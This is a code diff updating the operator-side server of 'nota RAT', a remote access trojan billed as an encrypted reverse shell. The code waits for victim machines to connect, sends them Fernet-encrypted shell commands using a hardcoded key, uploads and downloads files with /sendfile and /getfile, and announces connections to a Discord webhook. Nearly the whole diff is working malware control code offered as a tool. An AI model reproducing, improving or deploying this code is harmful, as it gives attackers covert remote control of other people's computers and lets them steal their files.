@@ -1,8 +1,5 @@
-import socket
-import argparse
-import os 
-import sys
-from pythonping import ping
+import socket, argparse, subprocess, re, os, time
+from sys import platform
 from cryptography.fernet import Fernet
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
@@ -28,14 +25,40 @@ SEPARATOR = "<sep>"
 key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
 
 
-print("""
-              _          _____         _______ 
-             | |        |  __ \     /\|__   __|
-  _ __   ___ | |_ __ _  | |__) |   /  \  | |   
- | '_ \ / _ \| __/ _` | |  _  /   / /\ \ | |   
- | | | | (_) | || (_| | | | \ \  / ____ \| |   
- |_| |_|\___/ \__\__,_| |_|  \_\/_/    \_\_|                                                
-       nota RAT v 1.0 | fluffydolphin                             
+''' Colors '''
+MAIN = '\033[38;5;50m'
+PLOAD = '\033[38;5;119m'
+GREEN = '\033[38;5;47m'
+BLUE = '\033[0;38;5;12m'
+ORANGE = '\033[0;38;5;214m'
+RED = '\033[1;31m'
+END = '\033[0m'
+BOLD = '\033[1m'
+
+
+''' MSG Prefixes '''
+INFO = f'{MAIN}Info{END}'
+EXIT = f'{MAIN}Exited{END}'
+WARN = f'{ORANGE}Warning{END}'
+IMPORTANT = WARN = f'{ORANGE}Important{END}'
+FAILED = f'{RED}Fail{END}'
+DEBUG = f'{ORANGE}Debug{END}'
+INPUT = f'{BLUE}Input{END}'
+REMOTE = WARN = f'{ORANGE}Remote{END}'
+CLEAR = f'{PLOAD}CLEARED{END}'
+
+
+print(f"""{PLOAD}
+                       __                                           __     
+                      /  |                                         /  |    
+ _______    ______   _$$ |_     ______          ______   ______   _$$ |_   
+/       \  /      \ / $$   |   /      \        /      \ /      \ / $$   |  
+$$$$$$$  |/$$$$$$  |$$$$$$/    $$$$$$  |      /$$$$$$  |$$$$$$  |$$$$$$/   
+$$ |  $$ |$$ |  $$ |  $$ | __  /    $$ |      $$ |  $$/ /    $$ |  $$ | __ 
+$$ |  $$ |$$ \__$$ |  $$ |/  |/$$$$$$$ |      $$ |     /$$$$$$$ |  $$ |/  |
+$$ |  $$ |$$    $$/   $$  $$/ $$    $$ |      $$ |     $$    $$ |  $$  $$/ 
+$$/   $$/  $$$$$$/     $$$$/   $$$$$$$/       $$/       $$$$$$$/    $$$$/                                                  
+                                           {END}nota RAT v1.0 | fluffydolphin                             
 """)
 
 
@@ -44,10 +67,13 @@ s = socket.socket()
 s.bind((SERVER_HOST, SERVER_PORT))
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.listen(5)
-print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+print(f"[{IMPORTANT}] {BOLD}Awaiting connection on {SERVER_HOST}:{SERVER_PORT} .....{END}")
 
 client_socket, client_address = s.accept()
-print(f"{client_address[0]}:{client_address[1]} Connected!")
+print(f"[{IMPORTANT}] {BOLD}{client_address[0]}:{client_address[1]} Connected! \n{END}")
+time.sleep(1)
+print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt .....{END}', end = '\n\n') #yes I stole this from hoax get over it
+time.sleep(1.8)
 
 
 if args.discord:
@@ -74,50 +100,81 @@ if args.discord:
 
 cwd = client_socket.recv(BUFFER_SIZE)
 cwd = Fernet(key).decrypt(cwd).decode()
-print("[+] Current working directory:", cwd)
+print(f"[{GREEN}Shell{END}] [+] Current working directory:", cwd)
 
 while True:
-    command = input(f"{cwd} $> ")
-    if not command.strip():
-        continue
-    commandz = Fernet(key).encrypt(command.encode())
-    client_socket.send(commandz)
-    if command.lower() == "exit":
-        if args.discord:
-            webhook = DiscordWebhook(url=args.discord, content='@everyone')
-            embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
-            embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
-            embed.add_embed_field(name='Disconnection', value=f'{client_address[0]}')
-            embed.set_timestamp()
-            webhook.add_embed(embed)
-            webhook.execute()
-        client_socket.close()
-        s.close()
-        break
-    if command == "/getfile":
-        filename = input("Please enter the filename: ")
-        filename = Fernet(key).encrypt(filename.encode())
-        client_socket.send(filename.encode())
-        remaining = int.from_bytes(client_socket.recv(4),'big')
-        f = open(filename,"wb")
-        while remaining:
-            data = client_socket.recv(min(remaining,4096))
-            remaining -= len(data)
-            f.write(data)
-        f.close()
-    if command == "/sendfile":
-        filename = input("Please enter the filename: ")
-        client_socket.send(bytes(filename, "utf-8"))
-        if filename in os.listdir():
-            with open(filename, "rb") as f:
+    try:
+        command = input(f"\n[{INPUT}] {cwd} $> ")
+        if not command.strip():
+            continue
+        if command == "exit" or command == "quit" or command == "q":
+            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
+            while(exit_choice != "y" and exit_choice != "n"):
+                print(f"[{FAILED}] (y/n) \n{END}")
+                time.sleep(0.4)
+                exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
+            if exit_choice == "y":
+                if args.discord:
+                    webhook = DiscordWebhook(url=args.discord, content='@everyone')
+                    embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
+                    embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
+                    embed.add_embed_field(name='Disconnection', value=f'{client_address[0]}')
+                    embed.set_timestamp()
+                    webhook.add_embed(embed)
+                    webhook.execute()
+                commands = "exit"
+                commands = Fernet(key).encrypt(commands.encode())
+                client_socket.send(commands)
+                client_socket.close()
+                s.close()
+                print(f"\n[{EXIT}] {END}\n")
+                break
+            if exit_choice == "n":
+                continue
+        commandz = Fernet(key).encrypt(command.encode())
+        client_socket.send(commandz)
+        if command == "/getfile":
+            filenames = input(f"[{IMPORTANT}] Please enter the filename: ")
+            filename = Fernet(key).encrypt(filenames.encode())
+            client_socket.send(filename)
+            remaining = int.from_bytes(client_socket.recv(4),'big')
+            f = open(f"./files/{filenames}","wb")
+            while remaining:
+                data = client_socket.recv(min(remaining,4096))
+                remaining -= len(data)
+                f.write(data)
+            f.close()
+        if command == "/sendfile":
+            filenames = input(f"[{IMPORTANT}] Please enter the filename: ")
+            filename = Fernet(key).encrypt(filenames.encode())
+            client_socket.send(filename)
+            with open(f"./files/{filenames}", "rb") as f:
                 data = f.read()
                 dataLen = len(data)
                 client_socket.send(dataLen.to_bytes(4,'big'))
                 client_socket.send(data)
             f.close()
-    output = client_socket.recv(BUFFER_SIZE)
-    output = Fernet(key).decrypt(output).decode()
-    results, cwd = output.split(SEPARATOR)
-    print(results)
+        output = client_socket.recv(BUFFER_SIZE)
+        output = Fernet(key).decrypt(output).decode()
+        results, cwd = output.split(SEPARATOR)
+        if command != "/getfile" and command != "/sendfile":
+            print(f"{GREEN}{results}{END}")
+        else: continue
+    except KeyboardInterrupt:
+        exit_choice = input(f"\n[{IMPORTANT}] Are you sure you want to exit (y/n)? {END}")
+        while(exit_choice != "y" and exit_choice != "n"):
+            print(f"[{FAILED}] (y/n) \n{END}")
+            time.sleep(0.4)
+            exit_choice = input(f"[{IMPORTANT}] Are you sure you want to exit (y/n)? {END} ")
+        if exit_choice == "y":
+            commands = "exit"
+            commands = Fernet(key).encrypt(commands.encode())
+            client_socket.send(commands)
+            client_socket.close()
+            s.close()
+            print(f"\n[{EXIT}] {END}\n")
+            break
+        if exit_choice == "n":
+            continue
 client_socket.close()
 s.close()
